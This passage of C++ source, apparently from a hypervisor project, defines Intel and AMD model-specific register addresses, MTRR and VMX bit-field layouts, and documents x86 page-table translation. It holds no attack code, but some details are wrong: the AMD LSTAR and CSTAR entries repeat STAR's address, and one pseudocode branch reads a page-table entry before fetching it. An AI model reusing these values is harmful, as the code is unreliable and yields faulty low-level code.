        msr.read();
        return msr;
    }
};



namespace Intel
{



enum class IntelMsr : unsigned int
{
    _IA32_FEATURE_CONTROL = 0x0000003A,
    _IA32_SYSENTER_CS = 0x00000174,
    _IA32_SYSENTER_ESP = 0x00000175,
    _IA32_SYSENTER_EIP = 0x00000176,
    _IA32_EFER = 0xC0000080,
    _IA32_STAR = 0xC0000081,
    _IA32_LSTAR = 0xC0000082,
    _IA32_CSTAR = 0xC0000083,
    _IA32_FS_BASE = 0xC0000100,
    _IA32_GS_BASE = 0xC0000101,
    _IA32_KERNEL_GS_BASE = 0xC0000102,
    _IA32_DEBUGCTL = 0x000001D9,

    // MTRR:
    _IA32_MTRRCAP = 0xFE,
    _IA32_MTRR_DEF_TYPE = 0x2FF,
    _IA32_MTRR_PHYSBASE0 = 0x200,
    _IA32_MTRR_PHYSMASK0 = 0x201,
    _IA32_MTRR_PHYSBASE1 = 0x202,
    _IA32_MTRR_PHYSMASK1 = 0x203,
    _IA32_MTRR_PHYSBASE2 = 0x204,
    _IA32_MTRR_PHYSMASK2 = 0x205,
    _IA32_MTRR_PHYSBASE3 = 0x206,
    _IA32_MTRR_PHYSMASK3 = 0x207,
    _IA32_MTRR_PHYSBASE4 = 0x208,
    _IA32_MTRR_PHYSMASK4 = 0x209,
    _IA32_MTRR_PHYSBASE5 = 0x20A,
    _IA32_MTRR_PHYSMASK5 = 0x20B,
    _IA32_MTRR_PHYSBASE6 = 0x20C,
    _IA32_MTRR_PHYSMASK6 = 0x20D,
    _IA32_MTRR_PHYSBASE7 = 0x20E,
    _IA32_MTRR_PHYSMASK7 = 0x20F,
    _IA32_MTRR_PHYSBASE8 = 0x210,
    _IA32_MTRR_PHYSMASK8 = 0x211,
    _IA32_MTRR_PHYSBASE9 = 0x212,
    _IA32_MTRR_PHYSMASK9 = 0x213,
    _IA32_MTRR_FIX64K_00000 = 0x250,
    _IA32_MTRR_FIX16K_80000 = 0x258,
    _IA32_MTRR_FIX16K_A0000 = 0x259,
    _IA32_MTRR_FIX4K_C0000 = 0x268,
    _IA32_MTRR_FIX4K_C8000 = 0x269,
    _IA32_MTRR_FIX4K_D0000 = 0x26A,
    _IA32_MTRR_FIX4K_D8000 = 0x26B,
    _IA32_MTRR_FIX4K_E0000 = 0x26C,
    _IA32_MTRR_FIX4K_E8000 = 0x26D,
    _IA32_MTRR_FIX4K_F0000 = 0x26E,
    _IA32_MTRR_FIX4K_F8000 = 0x26F,

    // VMX-related MSRs:
    _IA32_VMX_BASIC = 0x00000480,
    _IA32_VMX_PINBASED_CTLS = 0x481,
    _IA32_VMX_PROCBASED_CTLS = 0x482,
    _IA32_VMX_EXIT_CTLS = 0x483,
    _IA32_VMX_ENTRY_CTLS = 0x484,
    _IA32_VMX_MISC = 0x485,
    _IA32_VMX_CR0_FIXED0 = 0x486,
    _IA32_VMX_CR0_FIXED1 = 0x487,
    _IA32_VMX_CR4_FIXED0 = 0x488,
    _IA32_VMX_CR4_FIXED1 = 0x489,
    _IA32_VMX_VMCS_ENUM = 0x48A,
    _IA32_VMX_PROCBASED_CTLS2 = 0x48B,
    _IA32_VMX_EPT_VPID_CAP = 0x48C,
    _IA32_VMX_TRUE_PINBASED_CTLS = 0x48D,
    _IA32_VMX_TRUE_PROCBASED_CTLS = 0x48E,
    _IA32_VMX_TRUE_EXIT_CTLS = 0x48F,
    _IA32_VMX_TRUE_ENTRY_CTLS = 0x490,
    _IA32_VMX_VMFUNC = 0x491
};



enum class MtrrMemoryType : unsigned char
{
    Uncacheable = 0x00,
    WriteCombining = 0x01,
    // 0x02 and 0x03 are reserved
    WriteThrough = 0x04,
    WriteProtected = 0x05,
    WriteBack = 0x06,
    // 0x07..0xFF are reserved
};



namespace Layout
{



struct _IA32FeatureControl
{
    unsigned long long LockBit : 1;
    unsigned long long EnableVmxInsideSmx : 1;
    unsigned long long EnableVmxOutsideSmx : 1;
    unsigned long long : 5;
    unsigned long long SenterLocalFunctionEnables : 7;
    unsigned long long SenterGlobalEnable : 1;
    unsigned long long : 1;
    unsigned long long SgxLaunchControlEnable : 1;
    unsigned long long SgxGlobalEnable : 1;
    unsigned long long : 1;
    unsigned long long LmceOn : 1;
    unsigned long long : 43;
};

struct _IA32Efer
{
    unsigned long long SCE : 1; // Syscall enable (R/W) - enables syscall/sysret instructions in 64-bit mode 
    unsigned long long : 7;
    unsigned long long LME : 1; // Enables IA-32e mode operation (R/W)
    unsigned long long : 1;
    unsigned long long LMA : 1; // _IA32-e mode active (R)
    unsigned long long NXE : 1; // Execute Disable bit Enable (R/W)
    unsigned long long : 52;
};

struct _IA32VmxBasic
{
    unsigned long long VmcsRevision : 31;
    unsigned long long : 1;
    unsigned long long VmxonVmcsRegionsSize : 13;
    unsigned long long : 3;
    unsigned long long PhysicalAddressesWidth : 1; // 0 = Processor's physical-address width (always 0 on Intel64), 1 = 32-bit
    unsigned long long DualMonitorTreatmentOfSmiAndSmm : 1;
    unsigned long long MemoryType : 4; // 0 = Uncacheable, 6 = Write-back, 1..5 and 7..15 aren't used
    unsigned long long InsOutsReporting : 1;
    unsigned long long AnyVmxControlsThatDefaultToOneMayBeZeroed : 1;
    unsigned long long CanUseVMEntryToDeliverHardwareException : 1;
    unsigned long long : 7;
};

struct _IA32VmxEptVpidCap
{
    unsigned long long ExecuteOnlyTranslationsSupportByEpt : 1;
    unsigned long long : 5;
    unsigned long long PageWalkLength4Support : 1;
    unsigned long long : 1;
    unsigned long long UncacheableEptSupport : 1;
    unsigned long long : 5;
    unsigned long long WriteBackEptSupport : 1;
    unsigned long long : 1;
    unsigned long long EptPde2MbSupport : 1;
    unsigned long long EptPdpte1GbSupport : 1;
    unsigned long long : 2;
    unsigned long long InveptSupport : 1;
    unsigned long long AccessedDirtyFlagsSupported : 1;
    unsigned long long EptViolationsSupport : 1;
    unsigned long long SupervisorShadowStackControlSupported : 1;
    unsigned long long : 1;
    unsigned long long SingleContextInveptTypeSupported : 1;
    unsigned long long AllContextInveptTypeSupported : 1;
    unsigned long long : 5;
    unsigned long long InvvpidSupported : 1;
    unsigned long long : 7;
    unsigned long long IndividualAddressInvvpidTypeSupported : 1;
    unsigned long long SingleContextInvvpidTypeSupported : 1;
    unsigned long long AllContextInvvpidTypeSupported : 1;
    unsigned long long SingleContextRetainingGlobalsInvvpidTypeSupported : 1;
    unsigned long long : 20;
};

struct _IA32MtrrCap
{
    unsigned long long VCNT : 8; // Variable range registers count
    unsigned long long FIX : 1; // Fixed range registers supported
    unsigned long long : 1;
    unsigned long long WC : 1; // Write combining
    unsigned long long SMRR : 1; // System-management range registers
    unsigned long long PRMRR : 1; // Processor-reserved memory range registers (starting with 7th Gen and 8th Gen Intel Core processors)
    unsigned long long : 51;
};

struct _IA32MtrrDefType
{
    unsigned long long Type : 3; // Default memory type (the only valid values are 0, 1, 4, 5, and 6), look at the MtrrMemoryType
    unsigned long long : 7;
    unsigned long long FE : 1; // Fixed MTRRs are enabled
    unsigned long long E : 1; // MTRRs enabled
    unsigned long long : 52;
};



namespace MtrrGeneric
{



struct FixedGeneric
{
    static constexpr unsigned char k_subrangesCount = 8;

    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long TypeOfRange0 : 8;
            unsigned long long TypeOfRange1 : 8;
            unsigned long long TypeOfRange2 : 8;
            unsigned long long TypeOfRange3 : 8;
            unsigned long long TypeOfRange4 : 8;
            unsigned long long TypeOfRange5 : 8;
            unsigned long long TypeOfRange6 : 8;
            unsigned long long TypeOfRange7 : 8;
        } types;
    } generic;
};

struct Fixed64k
{
    static constexpr unsigned int k_subrangesCount = 8;
    static constexpr unsigned int k_rangeSize = 512 * 1024;
    static constexpr unsigned int k_subrangeSize = k_rangeSize / k_subrangesCount;

    // Maps the 512-Kbyte address range (0..7FFFF) divided into eight 64-Kbyte sub-ranges:
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long TypeOf64KbRange0 : 8; // 00000..0FFFF
            unsigned long long TypeOf64KbRange1 : 8; // 10000..1FFFF
            unsigned long long TypeOf64KbRange2 : 8; // 20000..2FFFF
            unsigned long long TypeOf64KbRange3 : 8; // 30000..3FFFF
            unsigned long long TypeOf64KbRange4 : 8; // 40000..4FFFF
            unsigned long long TypeOf64KbRange5 : 8; // 50000..5FFFF
            unsigned long long TypeOf64KbRange6 : 8; // 60000..6FFFF
            unsigned long long TypeOf64KbRange7 : 8; // 70000..7FFFF
        } layout;
        FixedGeneric generic;
    } types;
};

struct Fixed16k
{
    static constexpr unsigned int k_subrangesCount = 8;
    static constexpr unsigned int k_rangeSize = 128 * 1024;
    static constexpr unsigned int k_subrangeSize = k_rangeSize / k_subrangesCount;

    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long TypeOf16KbRange0 : 8; // 80000..83FFF  |  A0000..A3FFF
            unsigned long long TypeOf16KbRange1 : 8; // 84000..87FFF  |  A4000..A7FFF
            unsigned long long TypeOf16KbRange2 : 8; // 88000..8BFFF  |  A8000..ABFFF
            unsigned long long TypeOf16KbRange3 : 8; // 8C000..8FFFF  |  AC000..AFFFF
            unsigned long long TypeOf16KbRange4 : 8; // 90000..93FFF  |  B0000..B3FFF
            unsigned long long TypeOf16KbRange5 : 8; // 94000..97FFF  |  B4000..B7FFF
            unsigned long long TypeOf16KbRange6 : 8; // 98000..9BFFF  |  B8000..BBFFF
            unsigned long long TypeOf16KbRange7 : 8; // 9C000..9FFFF  |  BC000..BFFFF
        } layout;
        FixedGeneric generic;
    } types;
};

struct Fixed4k
{
    static constexpr unsigned int k_subrangesCount = 8;
    static constexpr unsigned int k_rangeSize = 32 * 1024;
    static constexpr unsigned int k_subrangeSize = k_rangeSize / k_subrangesCount;

    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long TypeOf4KbRange0 : 8; // [C..F]0000..[C..F]0FFF  |  [C..F]8000..[C..F]8FFF
            unsigned long long TypeOf4KbRange1 : 8; // [C..F]1000..[C..F]1FFF  |  [C..F]9000..[C..F]9FFF
            unsigned long long TypeOf4KbRange2 : 8; // [C..F]2000..[C..F]2FFF  |  [C..F]A000..[C..F]AFFF
            unsigned long long TypeOf4KbRange3 : 8; // [C..F]3000..[C..F]3FFF  |  [C..F]B000..[C..F]BFFF
            unsigned long long TypeOf4KbRange4 : 8; // [C..F]4000..[C..F]4FFF  |  [C..F]C000..[C..F]CFFF
            unsigned long long TypeOf4KbRange5 : 8; // [C..F]5000..[C..F]5FFF  |  [C..F]D000..[C..F]DFFF
            unsigned long long TypeOf4KbRange6 : 8; // [C..F]6000..[C..F]6FFF  |  [C..F]E000..[C..F]EFFF
            unsigned long long TypeOf4KbRange7 : 8; // [C..F]7000..[C..F]7FFF  |  [C..F]F000..[C..F]FFFF
        } layout;
        FixedGeneric generic;
    } types;
};

struct PhysBase
{
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long Type : 8; // Memory type for range
            unsigned long long : 4;
            unsigned long long PhysBasePfn : 52; // 36-bit or MAXPHYSADDR length (depending on CPUID(0x80000008)), all other bits are reserved
        } layout;
    } base;
};

struct PhysMask
{
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long : 11;
            unsigned long long V : 1; // Valid
            unsigned long long PhysMaskPfn : 52; // 36-bit or MAXPHYSADDR length (depending on CPUID(0x80000008)), all other bits are reserved
        } layout;
    } mask;
};



} // namespace MtrrGeneric


template <typename Type, unsigned int from, unsigned int to>
struct Mtrr : public Type
{
    using MtrrType = Type;
    static constexpr auto k_from = from;
    static constexpr auto k_to = to;
};



} // namespace Layout



struct _IA32FeatureControl
    : public Layout::_IA32FeatureControl
    , public MsrAddress<IntelMsr::_IA32_FEATURE_CONTROL>
{
};

struct _IA32Efer
    : public Layout::_IA32Efer
    , public MsrAddress<IntelMsr::_IA32_EFER>
{
};

struct _IA32VmxBasic
    : public Layout::_IA32VmxBasic
    , public MsrAddress<IntelMsr::_IA32_VMX_BASIC>
{
};

struct _IA32VmxEptVpidCap
    : public Layout::_IA32VmxEptVpidCap
    , public MsrAddress<IntelMsr::_IA32_VMX_EPT_VPID_CAP>
{
};

struct _IA32MtrrCap
    : public Layout::_IA32MtrrCap
    , public MsrAddress<IntelMsr::_IA32_MTRRCAP>
{
};

struct _IA32MtrrDefType
    : public Layout::_IA32MtrrDefType
    , public MsrAddress<IntelMsr::_IA32_MTRR_DEF_TYPE>
{
};



template <unsigned char index>
struct Mtrr;

template <>
struct Mtrr<0>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed64k, 0x00000, 0x7FFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX64K_00000>
{
};

template <>
struct Mtrr<1>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed16k, 0x80000, 0x9FFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX16K_80000>
{
};

template <>
struct Mtrr<2>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed16k, 0xA0000, 0xBFFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX16K_A0000>
{
};

template <>
struct Mtrr<3>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xC0000, 0xC7FFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_C0000>
{
};

template <>
struct Mtrr<4>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xC8000, 0xCFFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_C8000>
{
};

template <>
struct Mtrr<5>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xD0000, 0xD7FFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_D0000>
{
};

template <>
struct Mtrr<6>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xD8000, 0xDFFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_D8000>
{
};

template <>
struct Mtrr<7>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xE0000, 0xE7FFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_E0000>
{
};

template <>
struct Mtrr<8>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xE8000, 0xEFFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_E8000>
{
};

template <>
struct Mtrr<9>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xF0000, 0xF7FFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_F0000>
{
};

template <>
struct Mtrr<10>
    : public Layout::Mtrr<Layout::MtrrGeneric::Fixed4k, 0xF8000, 0xFFFFF>
    , public MsrAddress<IntelMsr::_IA32_MTRR_FIX4K_F8000>
{
};



template <unsigned char index>
struct PhysBase;

template <unsigned char index>
struct PhysMask;



template <>
struct PhysBase<0>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE0>
{
};

template <>
struct PhysMask<0>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK0>
{
};



template <>
struct PhysBase<1>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE1>
{
};

template <>
struct PhysMask<1>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK1>
{
};



template <>
struct PhysBase<2>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE2>
{
};

template <>
struct PhysMask<2>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK2>
{
};



template <>
struct PhysBase<3>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE3>
{
};

template <>
struct PhysMask<3>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK3>
{
};



template <>
struct PhysBase<4>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE4>
{
};

template <>
struct PhysMask<4>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK4>
{
};



template <>
struct PhysBase<5>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE5>
{
};

template <>
struct PhysMask<5>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK5>
{
};



template <>
struct PhysBase<6>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE6>
{
};

template <>
struct PhysMask<6>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK6>
{
};



template <>
struct PhysBase<7>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE7>
{
};

template <>
struct PhysMask<7>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK7>
{
};



template <>
struct PhysBase<8>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE8>
{
};

template <>
struct PhysMask<8>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK8>
{
};



template <>
struct PhysBase<9>
    : public Layout::MtrrGeneric::PhysBase
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSBASE9>
{
};

template <>
struct PhysMask<9>
    : public Layout::MtrrGeneric::PhysMask
    , public MsrAddress<IntelMsr::_IA32_MTRR_PHYSMASK9>
{
};



} // namespace Intel



namespace Amd
{



enum class AmdMsr : unsigned int
{
    PAT = 0x00000277, // Extension of the page tables in SVM (nested paging)
    EFER = 0xC0000080, // Etended Feature Enable Register
    STAR = 0xC0000081, // Legacy mode: address of a SYSCALL instruction
    LSTAR = 0xC0000081, // Long mode: address of a SYSCALL instruction
    CSTAR = 0xC0000081, // Compatibility mode: address of a SYSCALL instruction
    VM_CR = 0xC0010114, // Controls global aspects of SVM
    VM_HSAVE_PA = 0xC0010117, // Physical address of a 4KB block of memory where VMRUN saves host state, and from which #VMEXIT reloads host state
};



namespace Layout
{



struct Efer
{
    unsigned long long SystemCallExtensions : 1; // 1 = enable SYSCALL/SYSRET support
    unsigned long long : 7;
    unsigned long long LongModeEnable : 1;
    unsigned long long : 1;
    unsigned long long LongModeActive : 1;
    unsigned long long NoExecuteEnable : 1;
    unsigned long long SecureVirtualMachineEnable : 1;
    unsigned long long LongModeSegmentLimitEnable : 1;
    unsigned long long FastFxsaveFxrstor : 1;
    unsigned long long TranslationCacheExtension : 1;
    unsigned long long : 48;
};

struct VmCr
{
    unsigned long long DPD : 1;
    unsigned long long R_INIT : 1;
    unsigned long long DIS_A20M : 1;
    unsigned long long LOCK : 1;
    unsigned long long SVMDIS : 1; // When set, EFER.SVME must be zero
    unsigned long long : 59;
};



} // namespace Layout



struct Efer
    : public Layout::Efer
    , public MsrAddress<AmdMsr::EFER>
{
};

struct VmCr
    : public Layout::VmCr
    , public MsrAddress<AmdMsr::VM_CR>
{
};



} // namespace Amd



} // namespace Msr

#pragma pack(pop)
```

`DmaProtect/include/Arch/Pte.h`:

```h
#pragma once



/*



Tables:
PML5 = Page-Map Level-5.
PML4 = Page-Map Level-4.
PDP  = Page Directory Pointer.
PD   = Page Directory.
PT   = Page Table.

PML5E/PML4E/PDPE/PDE/PTE = Entries in the corresponding tables.

PFN = Page Frame Number (number of a physical page).
PageSize = Size of a page depending on CR4.PSE, PDPE.PS and PDE.PS bits (4Kb, 2Mb, 4Mb or 1Gb).

Each entry contains a 4Kb-based physical PFN of a next level table
except the last translation level that contains a PFN of a physical page.

Physical address of the first level translation table = [CR3.PML5/CR3.PML4/CR3.PDP/CR3.PD depending on the current processor mode] * 4Kb
Physical address of the next translation level table = [Current level table entry].PFN * 4Kb
Physical address translated from a given linear address = [The last table entry].PFN * PageSize + LinearAddress.Offset

FirstLevelTable = CR3.PFN * 4Kb
NextLevelTable = CurrentLevelTableEntry.PFN * 4Kb
PhysAddress = LastLevelTableEntry.PFN * PageSize + LinearAddress.Offset

CPU mode is specified by the EFER.LME and the EFER.LMA bits (Long Mode Enabled and Long Mode Active).

+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
|  Mode  | CR4.PAE | CR4.PSE | CR4.LA57 | PDPE.PS | PDE.PS | Page size | MAXPHYADDR |               Translation chain              |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
|  i386  |    0    |    0    |   N/A    |   N/A   |   0    |    4Kb    |   32 bit   | PDE -> PTE -> Phys                           |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
|  i386  |    0    |    1    |   N/A    |   N/A   |   0    |    4Kb    |   32 bit   | PDE -> PTE -> Phys                           |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
|  i386  |    0    |    1    |   N/A    |   N/A   |   1    |    4Mb    |   40 bit   | PDE -> Phys                                  |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
|  i386  |    1    | Ignored |   N/A    |   N/A   |   0    |    4Kb    |   52 bit   | PDPE -> PDE -> PTE -> Phys                   |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
|  i386  |    1    | Ignored |   N/A    |   N/A   |   1    |    2Mb    |   52 bit   | PDPE -> PDE -> Phys                          |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
| amd64  | Always1 | Ignored |    0     |    0    |   0    |    4Kb    |   52 bit   | PML4E -> PDPE -> PDE -> PTE -> Phys          |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
| amd64  | Always1 | Ignored |    0     |    0    |   1    |    2Mb    |   52 bit   | PML4E -> PDPE -> PDE -> Phys                 |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
| amd64  | Always1 | Ignored |    0     |    1    |  N/A   |    1Gb    |   52 bit   | PML4E -> PDPE -> Phys                        |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
| amd64  | Always1 | Ignored |    1     |    0    |   0    |    4Kb    |   52 bit   | PML5E -> PML4E -> PDPE -> PDE -> PTE -> Phys |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
| amd64  | Always1 | Ignored |    1     |    0    |   1    |    2Mb    |   52 bit   | PML5E -> PML4E -> PDPE -> PDE -> Phys        |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+
| amd64  | Always1 | Ignored |    1     |    1    |  N/A   |    1Gb    |   52 bit   | PML5E -> PML4E -> PDPE -> Phys               |
+--------+---------+---------+----------+---------+--------+-----------+------------+----------------------------------------------+

Linear address is interpreted differently depending on a CPU mode specified by EFER.LMA and CR4.[PAE/PSE/LA57]
and depending on a PageSize bit in PDPE/PDE entries belonging to the linear address.

The exact form of a linear address determines size of page tables.


Pseudocode describing translation principles:

if (EFER.LME && EFER.LMA) // Is long mode enabled and active?
{
    // It's a long mode (AMD64):

    PML4 = {}; // Depends on paging type (4-Level or 5-Level)

    if (CR4.LA57) // Is 5-level paging enabled?
    {
        // 5-level paging:
        PML5 = CR3.PML5_PFN * 4Kb;
        PML5E = PML5[LinearAddress.PML5_INDEX];

        PML4 = PML5E.PML4_PFN * 4Kb;
    }
    else
    {
        // 4-level paging:
        PML4 = CR3.PML4_PFN * 4Kb;
    }

    PML4E = PML4[LinearAddress.PML4_INDEX];

    PDP = PML4E.PDP_PFN * 4Kb;
    PDPE = PDP[LinearAddress.PDP_INDEX]

    if (PDPE.PS)
    {
        // PML4E -> PDPE -> PA
        PageSize = 1 Gbyte;
        PhysAddr = PDPE.PFN * PageSize + LinearAddress.OffsetInPage;
    }
    else
    {
        PD = PDPE.PD_PFN * 4Kb;
        PDE = PD[LinearAddress.PD_INDEX];

        if (PDE.PS)
        {
            // PML4E -> PDPE -> PDE -> PA
            PageSize = 2 Mbyte;
            PhysAddr = PDE.PFN * PageSize + LinearAddress.OffsetInPage;
        }
        else
        {
            // PML4E -> PDPE -> PDE -> PTE -> PA
            PT = PDE.PT_PFN * 4Kb;
            PTE = PT[LinearAddress.PT_INDEX];

            PageSize = 4 Kbyte;
            PhysAddr = PTE.PFN * PageSize + LinearAddress.OffsetInPage;
        }
    }
}
else
{
    // It's a legacy mode (i386):

    if (CR4.PAE)
    {
        // CR4.PSE is ignored in PAE mode.

        PDP = CR3.PDP_PFN * 4Kb;
        PDPE = PDP[LinearAddress.PDP_INDEX];

        PD = PDPE.PD_PFN * 4Kb;
        PDE = PD[LinearAddress.PD_INDEX];

        if (PDE.PS)
        {
            // PDPE -> PDE -> PA
            PageSize = 2 Mbyte;
            PhysAddr = PDE.PFN * PageSize + LinearAddress.OffsetInPage;
        }
        else
        {
            // PDPE -> PDE -> PTE -> PA

            PT = PDE.PT_PFN * 4Kb;
            PTE = PT[LinearAddress.PT_INDEX];

            PageSize = 4 Kbyte;
            PhysAddr = PTE.PFN * PageSize + LinearAddress.OffsetInPage;
        }
    }
    else
    {
        // Non-PAE mode:

        if (CR4.PSE) // Whether Page Size Extensions are enabled?
        {
            PD = CR3.PD_PFN * 4Kb;
            PDE = PD[LinearAddress.PD_INDEX];

            if (PDE.PS)
            {
                // PDE -> PA
                PageSize = 4 Mbyte;
                PhysAddr = PDE.PFN * PageSize + LinerAddress.OffsetInPage;
            }
            else
            {
                // PDE -> PTE -> PA
                
                PT = PDE.PT_PFN * 4Kb;
                PTE = PT[LinearAddress.PT_INDEX];
                
                PageSize = 4 Kbyte;
                PhysAddr = PTE.PFN * PageSize + LinearAddress.OffsetInPage;
            }
        }
        else
        {
            // PDE -> PTE -> PA
            // PDE.PS is ignored if Page Size Extentsions are disabled.

            PD = CR3.PD_PFN * 4Kb;
            PDE = PD[LinearAddress.PD_INDEX];

            PT = PTE.PT_PFN * 4Kb;
            PTE = PT[LinearAddress.PT_INDEX];

            PageSize = 4 Kbyte;
            PhysAddr = PTE.PFN * PageSize + LinearAddress.OffsetInPage;
        }
    }
}



Legacy mode, 4Kb pages:
EFER.LMA == 0
CR4.PAE  == 0
CR4.PSE  == 0

   Linear address:
   +----------+----------+----------------+
   | PD Index | PT Index | Offset in page |
   +--+-------+-----+----+---------+------+
      |             |              |
      |   PD Table  |              |
CR3 -----> +-----+  |              |
      |    | PDE |  |              |
      |    +-----+  |              +--------------------+
      |    | PDE |  |                                   |
      |    +-----+  | Page Table                        |
      +--> | PDE | ---> +-----+                         |
           +-----+  |   | PTE |                         |
           |     |  |   +-----+                         V
          ...   ... +-> | PTE | -> (PFN * PageSize) + Offset = PhysicalAddress
                        +-----+             [4Kb]
                        |     |
                       ...   ...



Legacy mode, PSE, 4Kb pages:
EFER.LMA == 0
CR4.PAE  == 0
CR4.PSE  == 1
PDE.PS   == 0

   Linear address:
   +----------+----------+----------------+
   | PD Index | PT Index | Offset in page |
   +--+-------+-----+----+---------+------+
      |             |              |
      |   PD Table  |              |
CR3 -----> +-----+  |              |
      |    | PDE |  |              |
      |    +-----+  |              +--------------------+
      |    | PDE |  |                                   |
      |    +-----+  | Page Table                        |
      +--> | PDE | ---> +-----+                         |
         / +-----+  |   | PTE |                         |
        /  |     |  |   +-----+                         V
       /  ...   ... +-> | PTE | -> (PFN * PageSize) + Offset = PhysicalAddress
      /                 +-----+             [4Kb]
 PDE.PS == 0            |     |
                       ...   ...


Legacy mode, PSE, large (4Mb) pages:
EFER.LMA == 0
CR4.PAE  == 0
CR4.PSE  == 1
PDE.PS   == 1

   Linear address:
   +----------+---------------------------+
   | PD Index |       Offset in page      |
   +--+-------+--------------------+------+
      |                            |
      |   PD Table                 |
CR3 -----> +-----+                 |
      |    | PDE |                 |
      |    +-----+                 +-------+
      |    | PDE |                         |
      |    +-----+                         V
      +--> | PDE | -> (PFN * PageSize) + Offset = PhysicalAddress
         / +-----+             [4Mb]
        /  |     |
       /  ...   ...
      /           
 PDE.PS == 1
                  


Legacy mode, PAE, 4Kb pages:
EFER.LMA == 0
CR4.PAE  == 1
PDE.PS   == 0

   Linear address:
   +------------+----------+----------+----------------+
   | PDPE Index | PD Index | PT Index | Offset in page |
   +-+----------+----+-----+------+---+----------+-----+
     |               |            |              |
     |  PDP Table    |  PD Table  |              |
CR3 ---> +------+  +---> +-----+  |              |
     |   | PDPE |  | |   | PDE |  |              |
     |   +------+  | |   +-----+  |              +--------------------+
     +-> | PDPE | -+ |   | PDE |  |                                   |
         +------+    |   +-----+  | Page Table                        |
         |      |    +-> | PDE | ---> +-----+                         |
        ...    ...     / +-----+  |   | PTE |                         |
                      /  |     |  |   +-----+                         V
                     /  ...   ... +-> | PTE | -> (PFN * PageSize) + Offset = PhysicalAddress
                    /                 +-----+             [4Kb]
               PDE.PS == 0            |     |
                                     ...   ...
        
        

Legacy mode, PAE, large (2Mb) pages:
EFER.LMA == 0
CR4.PAE  == 1
PDE.PS   == 1

   Linear address:
   +------------+----------+---------------------------+
   | PDPE Index | PD Index |       Offset in page      |
   +-+----------+----+-----+---------------------+-----+
     |               |                           |
     |  PDP Table    |  PD Table                 |
CR3 ---> +------+  +---> +-----+                 |
     |   | PDPE |  | |   | PDE |                 +-------+
     |   +------+  | |   +-----+                         |
     +-> | PDPE | -+ |   | PDE |                         |
         +------+    |   +-----+                         V
         |      |    +-> | PDE | -> (PFN * PageSize) + Offset = PhysicalAddress
        ...    ...     / +-----+ 
